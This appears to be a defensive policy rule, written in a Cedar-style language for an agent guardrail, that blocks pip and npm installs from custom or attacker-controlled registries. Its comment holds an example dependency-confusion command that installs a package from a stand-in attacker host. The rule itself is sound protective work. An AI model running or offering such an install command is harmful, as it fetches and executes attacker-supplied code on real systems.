// Block dependency confusion attacks via custom registries
// Prevents installation from attacker-controlled package sources
// Example: pip install -i http://attacker.com/simple package-name
@id("forbid-dependency-confusion-suspicious-source")
@description("Block dependency confusion attacks via custom or attacker-controlled package registries.")
forbid (
    principal,
    action == Sondera::Action::"ShellCommand",
    resource
)
when {
    (context.command like "*pip install*" ||
     context.command like "*npm install*") &&
    (context.command like "*--index-url*" ||
     context.command like "*-i*" ||
     context.command like "*--registry*") &&
    context.signature.categories.contains("exfiltration")
};
